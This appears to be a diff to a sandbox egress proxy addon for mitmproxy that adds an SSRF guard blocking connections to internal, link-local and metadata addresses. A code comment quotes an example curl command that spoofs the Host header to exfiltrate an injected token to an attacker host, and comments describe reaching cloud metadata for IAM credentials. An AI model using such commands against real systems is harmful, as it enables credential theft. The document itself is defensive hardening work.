@@ -10,8 +10,10 @@ from __future__ import annotations
 
 import base64
 import fnmatch
+import ipaddress
 import json
 import os
+import socket
 import threading
 import time
 import urllib.request
@@ -173,9 +175,77 @@ STRIP_CLIENT_CREDENTIAL_HEADERS = (
     "PRIVATE-TOKEN",
 )
 
+# Open egress means the PUBLIC internet, not internal infrastructure. When True,
+# the proxy refuses to connect on the sandbox's behalf to any destination that
+# resolves to a loopback/link-local/private/reserved address. This stops the
+# proxy from being used as a confused deputy for SSRF: without it, untrusted
+# sandbox code (whose own egress is locked down by the NetworkPolicy) can ask the
+# proxy to reach cloud metadata (169.254.169.254 -> node IAM credentials), the
+# Kubernetes API, or the orchestrator's own control-plane API. A host explicitly
+# configured in HOST_RULES (e.g. a private git server you added) is exempt so
+# intentional internal targets keep working.
+BLOCK_INTERNAL_EGRESS = True
+
 # =============================================================================
 # Addon implementation: normal users should not need to edit below this line.
 # =============================================================================
+
+
+def _resolve_ips(host: str) -> list[ipaddress._BaseAddress]:
+    host = (host or "").strip().strip("[]")
+    try:
+        return [ipaddress.ip_address(host)]
+    except ValueError:
+        pass
+    ips: list[ipaddress._BaseAddress] = []
+    try:
+        for _family, _type, _proto, _canon, sockaddr in socket.getaddrinfo(host, None):
+            raw = str(sockaddr[0]).split("%")[0]
+            try:
+                ips.append(ipaddress.ip_address(raw))
+            except ValueError:
+                continue
+    except (socket.gaierror, UnicodeError):
+        return []
+    return ips
+
+
+def _is_internal_ip(ip: ipaddress._BaseAddress) -> bool:
+    return (
+        ip.is_private
+        or ip.is_loopback
+        or ip.is_link_local
+        or ip.is_reserved
+        or ip.is_multicast
+        or ip.is_unspecified
+    )
+
+
+def _destination_blocked(host: str) -> bool:
+    """True if the proxy must refuse to reach `host` on the sandbox's behalf.
+
+    Intentional configured destinations in HOST_RULES are always allowed. Every
+    other host is blocked when it resolves to an internal address (or cannot be
+    resolved at all: fail closed so DNS tricks cannot slip past this guard).
+    """
+    if not BLOCK_INTERNAL_EGRESS:
+        return False
+    _pattern, rule = _find_rule(host)
+    if rule is not None:
+        return False
+    ips = _resolve_ips(host)
+    if not ips:
+        return True
+    return any(_is_internal_ip(ip) for ip in ips)
+
+
+def _deny_internal(flow: http.HTTPFlow, host: str) -> None:
+    flow.response = http.Response.make(
+        403,
+        b"egress to internal/link-local addresses is denied by the sandbox proxy\n",
+        {"content-type": "text/plain; charset=utf-8"},
+    )
+    ctx.log.warn(f"egress denied: host={host!r} resolves to an internal address (SSRF guard)")
 
 
 def _basic_auth(username: str, token: str) -> str:
@@ -372,6 +442,18 @@ def tls_clienthello(data) -> None:
         data.ignore_connection = True
 
 
+def http_connect(flow: http.HTTPFlow) -> None:
+    """Gate HTTPS CONNECT tunnels before any bytes flow.
+
+    Sandboxes use HTTPS_PROXY, so every HTTPS request first issues a CONNECT to
+    the upstream authority. Denying it here blocks the tunnel outright (for both
+    intercepted credential hosts and pass-through hosts) when the target is an
+    internal/link-local address.
+    """
+    if _destination_blocked(flow.request.host):
+        _deny_internal(flow, flow.request.host)
+
+
 def request(flow: http.HTTPFlow) -> None:
     """mitmproxy request hook for HTTP and intercepted HTTPS requests."""
     # SECURITY: the egress allowlist AND credential-injection decision must be based
@@ -381,6 +463,12 @@ def request(flow: http.HTTPFlow) -> None:
     # can spoof (e.g. `curl http://attacker/ -H 'Host: github.com'`) to make the proxy
     # inject the real token and then deliver it to an attacker-controlled server.
     conn_host = flow.request.host
+
+    # SSRF guard: never forward plain-HTTP requests to internal targets either.
+    if _destination_blocked(conn_host):
+        _deny_internal(flow, conn_host)
+        return
+
     header_host = flow.request.host_header or ""
     host_pattern, rule = _find_rule(conn_host)
 
